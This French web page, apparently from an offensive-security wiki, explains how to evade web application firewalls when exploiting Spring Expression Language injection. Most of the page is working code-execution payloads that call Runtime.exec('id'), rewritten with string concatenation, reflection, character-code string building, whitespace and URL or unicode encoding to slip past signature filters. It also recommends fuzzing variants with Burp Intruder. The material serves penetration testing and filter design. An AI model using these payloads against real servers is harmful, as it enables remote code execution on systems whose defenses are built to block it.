---
title: "Contournement de WAF SpEL : obfusquer les payloads du Spring Expression Language"
description: "Les payloads d'exécution de code SpEL sont réécrits avec concaténation de chaînes, construction de caractères et réflexion pour défaire les filtres à signatures tout en restant un Spring Expression Language valide."
keywords:
  - contournement de WAF SpEL
  - obfuscation SpEL
  - "T(java.lang.Character) toChars"
  - concaténation de chaînes SpEL
  - évasion de signature
---

# Contournement de WAF

Les filtres devant un puits SpEL se calent généralement sur des tokens : le littéral `Runtime`, la séquence de référence de type `T(`, `exec`, ou une chaîne de commande entre guillemets. SpEL fournit suffisamment de grammaire pour exprimer le même payload sans qu'aucun de ces tokens n'apparaisse de façon contiguë, donc un filtre calé sur une signature est défait tandis que l'expression s'évalue toujours au même appel. Chaque variante ci-dessous reste un SpEL valide sous un `StandardEvaluationContext`.

## Scinder les noms de classe et de méthode

La concaténation de chaînes à l'intérieur d'une référence `T(...)` ou d'un argument `forName` casse un nom de classe littéral en morceaux que le filtre ne voit jamais en entier :

```
T(java.lang.Runtime).getRuntime().exec('i'+'d')
```

```
''.class.forName('java.lang.Run'+'time').getMethod('getRun'+'time').invoke(null).exec('id')
```

Un appel direct `.exec('id')` ne peut pas scinder son token, mais appeler `exec` par réflexion le peut : passez le nom à `getMethod`, construit à partir de fragments, et `invoke`-le, de sorte que le littéral `exec` n'apparaît jamais :

```
''.class.forName('java.lang.Run'+'time').getMethod('getRun'+'time').invoke(null).getClass().getMethod('ex'+'ec',T(java.lang.String)).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')
```

## Construire des chaînes à partir de caractères

Là où les chaînes entre guillemets sont entièrement retirées, construisez-les à partir de codes de caractères. `T(java.lang.Character).toChars(int)` renvoie un `char[]` pour un point de code, et `new String(char[])` assemble le mot, de sorte qu'une commande apparaît sous forme d'arithmétique plutôt que de texte :

```
new String(new char[]{T(java.lang.Character).toChars(105)[0],T(java.lang.Character).toChars(100)[0]})
```

La même approche reconstruit un nom de classe passé à `forName`, de sorte que ni le nom de classe ni la commande n'existent comme littéral lisible dans le payload.

## Réflexion à la place de l'opérateur de type

Lorsque la séquence `T(` elle-même est bloquée, la voie par réflexion atteint la classe identique depuis un littéral de chaîne sans aucun opérateur de type présent :

```
''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke('').exec('id')
```

## Espaces blancs et encodage

SpEL tolère les espaces blancs et les commentaires entre les tokens, donc en insérer casse les signatures d'adjacence sans changer l'évaluation :

```
T(java.lang.Runtime) .getRuntime() .exec('id')
```

À la couche transport, le champ de requête environnant porte son propre décodage, donc l'encodage URL, le double encodage URL ou les échappements unicode JSON (`\u0052` pour `R`) sur les mots-clés sont décodés avant que la chaîne n'atteigne le parseur, laissant un `Runtime` encodé passer un filtre qui inspecte le corps brut. Empiler une commande construite par caractères avec un nom de classe concaténé et un encodage de transport ne laisse aucun token de signature unique intact.

## Outils

- **Burp Suite** : Intruder pour fuzzer des variantes SpEL obfusquées et Repeater pour itérer les contournements.
- Obfuscation manuelle : concaténation de chaînes, construction de caractères et encodage de transport.

## Références

- [Spring Framework: Spring Expression Language](https://docs.spring.io/spring-framework/reference/core/expressions.html)
- [PayloadsAllTheThings: Java SpEL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
